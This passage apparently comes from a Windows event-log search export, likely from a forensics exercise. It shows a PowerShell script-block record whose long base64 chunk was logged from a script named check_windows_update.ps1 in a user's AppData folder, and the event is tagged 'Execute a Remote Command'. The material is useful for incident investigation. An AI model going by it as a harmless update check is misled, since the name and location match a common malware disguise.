wYHAAIEBQYHBgcCBAUGBwUGBwABBAUGBwYHAQQFBgcFBgcABAUGBwUGBwQFBgcEBQYHAAECAwUGBwcBAgMFBgcGBwACAwUGBwYHAgMFBgcFBgcAAQMFBgcGBwEDBQYHBQYHAAMFBgcFBgcDBQYHBAUGBwABAgUGBwYHAQIFBgcFBgcAAgUGBwUGBwIFBgcEBQYHAAEFBgcFBgcBBQYHBAUGBwAFBgcEBQYHBQYHAwQFBgcAAQIDBAYHBwECAwQGBwYHAAIDBAYHBgcCAwQGBwUGBwABAwQGBwYHAQMEBgcFBgcAAwQGBwUGBwMEBgcEBQYHAAECBAYHBgcBAgQGBwUGBwACBAYHBQYHAgQGBwQFBgcAAQQGBwUGBwEEBgcEBQYHAAQGBwQFBgcEBgcDBAUGBwABAgMGBwYHAQIDBgcFBgcAAgMGBwUGBwIDBgcEBQYHAAEDBgcFBgcBAwYHBAUGBwADBgcEBQYHAwYHAwQFBgcAAQIGBwUGBwECBgcEBQYHAAIGBwQFBgcCBgcDBAUGBwABBgcEBQYHAQYHAwQFBgcABgcDBAUGBwYHAgMEBQYHAAECAwQFBwcBAgMEBQcGBwACAwQFBwYHAgMEBQcFBgcAAQMEBQcGBwEDBAUHBQYHAAMEBQcFBgcDBAUHBAUGBwABAgQFBwYHAQIEBQcFBgcAAgQFBwUGBwIEBQcEBQYHAAEEBQcFBgcBBAUHBAUGBwAEBQcEBQYHBAUHAwQFBgcAAQIDBQcGBwECAwUHBQYHAAIDBQcFBgcCAwUHBAUGBwABAwUHBQYHAQMFBwQFBgcAAwUHBAUGBwMFBwMEBQYHAAECBQcFBgcBAgUHBAUGBwACBQcEBQYHAgUHAwQFBgcAAQUHBAUGBwEFBwMEBQYHAAUHAwQFBgcFBwIDBAUGBwABAgMEBwYHAQIDBAcFBgcAAgMEBwUGBwIDBAcEBQYHAAEDBAcFBgcBAwQHBAUGBwADBAcEBQYHAwQHAwQFBgcAAQIEBwUGBwECBAcEBQYHAAIEBwQFBgcCBAcDBAUGBwABBAcEBQYHAQQHAwQFBgcABAcDBAUGBwQHAgMEBQYHAAECAwcFBgcBAgMHBAUGBwACAwcEBQYHAgMHAwQFBgcAAQMHBAUGBwEDBwMEBQYHAAMHAwQFBgcDBwIDBAUGBwABAgcEBQYHAQIHAwQFBgcAAgcDBAUGBwIHAgMEBQYHAAEHAwQFBgcBBwIDBAUGBwAHAgMEBQYHBwECAwQFBgcAAQIDBAUGBwECAwQFBgYHAAIDBAUGBgcCAwQFBgUGBwABAwQFBgYHAQMEBQYFBgcAAwQFBgUGBwMEBQYEBQYHAAECBAUGBgcBAgQFBgUGBwACBAUGBQYHAgQFBgQFBgcAAQQFBgUGBwEEBQYEBQYHAAQFBgQFBgcEBQYDBAUGBwABAgMFBgYHAQIDBQYFBgcAAgMFBgUGBwIDBQYEBQYHAAEDBQYFBgcBAwUGBAUGBwADBQYEBQYHAwUGAwQFBgcAAQIFBgUGBwECBQYEBQYHAAIFBgQFBgcCBQYDBAUGBwABBQYEBQYHAQUGAwQFBgcABQYDBAUGBwUGAgMEBQYHAAECAwQGBgcBAgMEBgUGBwACAwQGBQYHAgMEBgQFBgcAAQMEBgUGBwEDBAYEBQYHAAMEBgQFBgcDBAYDBAUGBwABAgQGBQYHAQIEBgQFBgcAAgQGBAUGBwIEBgMEBQYHAAEEBgQFBgcBBAYDBAUGBwAEBgMEBQYHBAYCAwQFBgcAAQIDBgUGBwECAwYEBQYHAAIDBgQFBgcCAwYDBAUGBwABAwYEBQYHAQMGAwQFBgcAAwYDBAUGBwMGAgMEBQYHAAECBgQFBgcBAgYDBAUGBwACBgMEBQYHAgYCAwQFBgcAAQYDBAUGBwEGAgMEBQYHAAYCAwQFBgcGAQIDBAUGBwABAgMEBQYHAQIDBAUFBgcAAgMEBQUGBwIDBAUEBQYHAAEDBAUFBgcBAwQFBAUGBwADBAUEBQYHAwQFAwQFBgcAAQIEBQUGBwECBAUEBQYHAAIEBQQFBgcCBAUDBAUGBwABBAUEBQYHAQQFAwQFBgcABAUDBAUGBwQFAgMEBQYHAAECAwUFBgcBAgMFBAUGBwACAwUEBQYHAgMFAwQFBgcAAQMFBAUGBwEDBQMEBQYHAAMFAwQFBgcDBQIDBAUGBwABAgUEBQYHAQIFAwQFBgcAAgUDBAUGBwIFAgMEBQYHAAEFAwQFBgcBBQIDBAUGBwAFAgMEBQYHBQECAwQFBgcAAQIDBAUGBwECAwQEBQYHAAIDBAQFBgcCAwQDBAUGBwABAwQEBQYHAQMEAwQFBgcAAwQDBAUGBwMEAgMEBQYHAAECBAQFBgcBAgQDBAUGBwACBAMEBQYHAgQCAwQFBgcAAQQDBAUGBwEEAgMEBQYHAAQCAwQFBgcEAQIDBAUGBwABAgMEBQYHAQIDAwQFBgcAAgMDBAUGBwIDAgMEBQYHAAEDAwQFBgcBAwIDBAUGBwADAgMEBQYHAwECAwQFBgcAAQIDBAUGBwECAgMEBQYHAAICAwQFBgcCAQIDBAUGBwABAgMEBQYHAQECAwQFBgcAAQIDBAUGBwABAgMEBQYHCAcHBgcGBgUHBgYFBgUFBAcGBgUGBQUEBgUFBAUEBAMHBgYFBgUFBAYFBQQFBAQDBgUFBAUEBAMFBAQDBAMDAgcGBgUGBQUEBgUFBAUEBAMGBQUEBQQEAwUEBAMEAwMCBgUFBAUEBAMFBAQDBAMDAgUEBAMEAwMCBAMDAgMCAgEHBgYFBgUFBAYFBQQFBAQDBgUFBAUEBAMFBAQDBAMDAgYFBQQFBAQDBQQEAwQDAwIFBAQDBAMDAgQDAwIDAgIBBgUFBAUEBAMFBAQDBAMDAgUEBAMEAwMCBAMDAgMCAgEFBAQDBAMDAgQDAwIDAgIBBAMDAgMCAgEDAgIBAgEBAAABAgMEBQYHCAkKCwwNDg8CAwQFBgcICQoLDA0ODw4PAAEEBQYHCAkKCwwNDg8ODwQFBgcICQoLDA0ODwwNDg8AAQIDBgcICQoLDA0ODw4PAgMGBwgJCgsMDQ4PDA0ODwABBgcICQoLDA0ODwwNDg8GBwgJCgsMDQ4PCgsMDQ4PAAECAwQFCAkKCwwNDg8ODwIDBAUICQoLDA0ODwwNDg8AAQQFCAkKCwwNDg8MDQ4PBAUICQoLDA0ODwoLDA0ODwABAgMICQoLDA0ODwwNDg8CAwgJCgsMDQ4PCgsMDQ4PAAEICQoLDA0ODwoLDA0ODwgJCgsMDQ4PCAkKCwwNDg8AAQIDBAUGBwoLDA0ODw4PAgMEBQYHCgsMDQ4PDA0ODwABBAUGBwoLDA0ODwwNDg8EBQYHCgsMDQ4PCgsMDQ4PAAECAwYHCgsMDQ4PDA0ODwIDBgcKCwwNDg8KCwwNDg8AAQYHCgsMDQ4PCgsMDQ4PBgcKCwwNDg8ICQoLDA0ODwABAgMEBQoLDA0ODwwNDg8CAwQFCgsMDQ4PCgsMDQ4PAAEEBQoLDA0ODwoLDA0ODwQFCgsMDQ4PCAkKCwwNDg8AAQIDCgsMDQ4PCgsMDQ4PAgMKCwwNDg8ICQoLDA0ODwABCgsMDQ4PCAkKCwwNDg8KCwwNDg8GBwgJCgsMDQ4PAAECAwQFBgcICQwNDg8ODwIDBAUGBwgJDA0ODwwNDg8AAQQFBgcICQwNDg8MDQ4PBAUGBwgJDA0ODwoLDA0ODwABAgMGBwgJDA0ODwwNDg8CAwYHCAkMDQ4PCgsMDQ4PAAEGBwgJDA0ODwoLDA0ODwYHCAkMDQ4PCAkKCwwNDg8AAQIDBAUICQwNDg8MDQ4PAgMEBQgJDA0ODwoLDA0ODwABBAUICQwNDg8KCwwNDg8EBQgJDA0ODwgJCgsMDQ4PAAECAwgJDA0ODwoLDA0ODwIDCAkMDQ4PCAkKCwwNDg8AAQgJDA0ODwgJCgsMDQ4PCAkMDQ4PBgcICQoLDA0ODwABAgMEBQYHDA0ODwwNDg8CAwQFBgcMDQ4PCgsMDQ4PAAEEBQYHDA0ODwoLDA0ODwQFBgcMDQ4PCAkKCwwNDg8AAQIDBgcMDQ4PCgsMDQ4PAgMGBwwNDg8ICQoLDA0ODwABBgcMDQ4PCAkKCwwNDg8GBwwNDg8GBwgJCgsMDQ4PAAECAwQFDA0ODwoLDA0ODwIDBAUMDQ4PCAkKCwwNDg8AAQQFDA0ODwgJCgsMDQ4PBAUMDQ4PBgcICQoLDA0ODwABAgMMDQ4PCAkKCwwNDg8CAwwNDg8GBwgJCgsMDQ4PAAEMDQ4PBgcICQoLDA0ODwwNDg8EBQYHCAkKCwwNDg8AAQIDBAUGBwgJCgsODw4PAgMEBQYHCAkKCw4PDA0ODwABBAUGBwgJCgsODwwNDg8EBQYHCAkKCw4PCgsMDQ4PAAECAwYHCAkKCw4PDA0ODwIDBgcICQoLDg8KCwwNDg8AAQYHCAkKCw4PCgsMDQ4PBgcICQoLDg8ICQoLDA0ODwABAgMEBQgJCgsODwwNDg8CAwQFCAkKCw4PCgsMDQ4PAAEEBQgJCgsODwoLDA0ODwQFCAkKCw4PCAkKCwwNDg8AAQIDCAkKCw4PCgsMDQ4PAgMICQoLDg8ICQoLDA0ODwABCAkKCw4PCAkKCwwNDg8ICQoLDg8GBwgJCgsMDQ4PAAECAwQFBgcKCw4PDA0ODwIDBAUGBwoLDg8KCwwNDg8AAQQFBgcKCw4PCgsMDQ4PBAUGBwoLDg8ICQoLDA0ODwABAgMGBwoLDg8KCwwNDg8CAwYHCgsODwgJCgsMDQ4PAAEGBwoLDg8ICQoLDA0ODwYHCgsODwYHCAkKCwwNDg8AAQIDBAUKCw4PCgsMDQ4PAgMEBQoLDg8ICQoLDA0ODwABBAUKCw4PCAkKCwwNDg8EBQoLDg8GBwgJCgsMDQ4PAAECAwoLDg8ICQoLDA0ODwIDCgsODwYHCAkKCwwNDg8AAQoLDg8GBwgJCgsMDQ4PCgsODwQFBgcICQoLDA0ODwABAgMEBQYHCAkODwwNDg8CAwQFBgcICQ4PCgsMDQ4PAAEEBQYHCAkODwoLDA0ODwQFBgcICQ4PCAkKCwwNDg8AAQIDBgcICQ4PCgsMDQ4PAgMGBwgJDg8ICQoLDA0ODwABBgcICQ4PCAkKCwwNDg8GBwgJDg8GBwgJCgsMDQ4PAAECAwQFCAkODwoLDA0ODwIDBAUICQ4PCAkKCwwNDg8AAQQFCAkODwgJCgsMDQ4PBAUICQ4PBgcICQoLDA0ODwABAgMICQ4PCAkKCwwNDg8CAwgJDg8GBwgJCgsMDQ4PAAEICQ4PBgcICQoLDA0ODwgJDg8EBQYHCAkKCwwNDg8AAQIDBAUGBw4PCgsMDQ4PAgMEBQYHDg8ICQoLDA0ODwABBAUGBw4PCAkKCwwNDg8EBQYHDg8GBwgJCgsMDQ4PAAECAwYHDg8ICQoLDA0ODwIDBgcODwYHCAkKCwwNDg8AAQYHDg8GBwgJCgsMDQ4PBgcODwQFBgcICQoLDA0ODwABAgMEBQ4PCAkKCwwNDg8CAwQFDg8GBwgJCgsMDQ4PAAEEBQ4PBgcICQoLDA0ODwQFDg8EBQYHCAkKCwwNDg8AAQIDDg8GBwgJCgsMDQ4PAgMODwQFBgcICQoLDA0ODwABDg8EBQYHCAkKCwwNDg8ODwIDBAUGBwgJCgsMDQ4PAAECAwQFBgcICQoLDA0ODwIDBAUGBwgJCgsMDQwNDg8AAQQFBgcICQoLDA0MDQ4PBAUGBwgJCgsMDQoLDA0ODwABAgMGBwgJCgsMDQwNDg8CAwYHCAkKCwwNCgsMDQ4PAAEGBwgJCgsMDQoLDA0ODwYHCAkKCwwNCAkKCwwNDg8AAQIDBAUICQoLDA0MDQ4PAgMEBQgJCgsMDQoLDA0ODwABBAUICQoLDA0KCwwNDg8EBQgJCgsMDQgJCgsMDQ4PAAECAwgJCgsMDQoLDA0ODwIDCAkKCwwNCAkKCwwNDg8AAQgJCgsMDQgJCgsMDQ4PCAkKCwwNBgcICQoLDA0ODwABAgMEBQYHCgsMDQwNDg8CAwQFBgcKCwwNCgsMDQ4PAAEEBQYHCgsMDQoLDA0ODwQFBgcKCwwNCAkKCwwNDg8AAQIDBgcKCwwNCgsMDQ4PAgMGBwoLDA0ICQoLDA0ODwABBgcKCwwNCAkKCwwNDg8GBwoLDA0GBwgJCgsMDQ4PAAECAwQFCgsMDQoLDA0ODwIDBAUKCwwNCAkKCwwNDg8AAQQFCgsMDQgJCgsMDQ4PBAUKCwwNBgcICQoLDA0ODwABAgMKCwwNCAkKCwwNDg8CAwoLDA0GBwgJCgsMDQ4PAAEKCwwNBgcICQoLDA0ODwoLDA0EBQYHCAkKCwwNDg8AAQIDBAUGBwgJDA0MDQ4PAgMEBQYHCAkMDQoLDA0ODwABBAUGBwgJDA0KCwwNDg8EBQYHCAkMDQgJCgsMDQ4PAAECAwYHCAkMDQoLDA0ODwIDBgcICQwNCAkKCwwNDg8AAQYHCAkMDQgJCgsMDQ4PBgcICQwNBgcICQoLDA0ODwABAgMEBQgJDA0KCwwNDg8CAwQFCAkMDQgJCgsMDQ4PAAEEBQgJDA0ICQoLDA0ODwQFCAkMDQYHCAkKCwwNDg8AAQIDCAkMDQgJCgsMDQ4PAgMICQwNBgcICQoLDA0ODwABCAkMDQYHCAkKCwwNDg8ICQwNBAUGBwgJCgsMDQ4PAAECAwQFBgcMDQoLDA0ODwIDBAUGBwwNCAkKCwwNDg8AAQQFBgcMDQgJCgsMDQ4PBAUGBwwNBgcICQoLDA0ODwABAgMGBwwNCAkKCwwNDg8CAwYHDA0GBwgJCgsMDQ4PAAEGBwwNBgcICQoLDA0ODwYHDA0EBQYHCAkKCwwNDg8AAQIDBAUMDQgJCgsMDQ4PAgMEBQwNBgcICQoLDA0ODwABBAUMDQYHCAkKCwwNDg8EBQwNBAUGBwgJCgsMDQ4PAAECAwwNBgcICQoLDA0ODwIDDA0EBQYHCAkKCwwNDg8AAQwNBAUGBwgJCgsMDQ4PDA0CAwQFBgcICQoLDA0ODwABAgMEBQYHCAkKCwwNDg8CAwQFBgcICQoLCgsMDQ4PAAEEBQYHCAkKCwoLDA0ODwQFBgcICQoLCAkKCwwNDg8AAQIDBgcICQoLCgsMDQ4PAgMGBwgJCgsICQoLDA0ODwABBgcICQoLCAkKCwwNDg8GBwgJCgsGBwgJCgsMDQ4PAAECAwQFCAkKCwoLDA0ODwIDBAUICQoLCAkKCwwNDg8AAQQFCAkKCwgJCgsMDQ4PBAUICQoLBgcICQoLDA0ODwABAgMICQoLCAkKCwwNDg8CAwgJCgsGBwgJCgsMDQ4PAAEICQoLBgcICQoLDA0ODwgJCgsEBQYHCAkKCwwNDg8AAQIDBAUGBwoLCgsMDQ4PAgMEBQYHCgsICQoLDA0ODwABBAUGBwoLCAkKCwwNDg8EBQYHCgsGBwgJCgsMDQ4PAAECAwYHCgsICQoLDA0ODwIDBgcKCwYHCAkKCwwNDg8AAQYHCgsGBwgJCgsMDQ4PBgcKCwQFBgcICQoLDA0ODwABAgMEBQoLCAkKCwwNDg8CAwQFCgsGBwgJCgsMDQ4PAAEEBQoLBgcICQoLDA0ODwQFCgsEBQYHCAkKCwwNDg8AAQIDCgsGBwgJCgsMDQ4PAgMKCwQFBgcICQoLDA0ODwABCgsEBQYHCAkKCwwNDg8KCwIDBAUGBwgJCgsMDQ4PAAECAwQFBgcICQoLDA0ODwIDBAUGBwgJCAkKCwwNDg8AAQQFBgcICQgJCgsMDQ4PBAUGBwgJBgcICQoLDA0ODwABAgMGBwgJCAkKCwwNDg8CAwYHCAkGBwgJCgsMDQ4PAAEGBwgJBgcICQoLDA0ODwYHCAkEBQYHCAkKCwwNDg8AA",
                "MessageNumber": "21",
                "Path": """C:\Users\konoha\AppData\Roaming\check_windows_update.ps1"""
              }
            },
            "event": {
              "created": "2025-10-22T17:22:20.889Z",
              "action": "Execute a Remote Command",
              "kind": "event",
              "code": "4104",
              "provider": "Microsoft-Windows-PowerShell"
            },
            "log": {
              "level": "verbose"
            },
            "agent": {
              "version": "9.1.2",
              "name": "DESKTOP-48ASLS3",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "architecture": "x86_64",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "name": "Windows 10 Education",
                "version": "10.0",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.133Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.133Z",
            210
          ]
        },
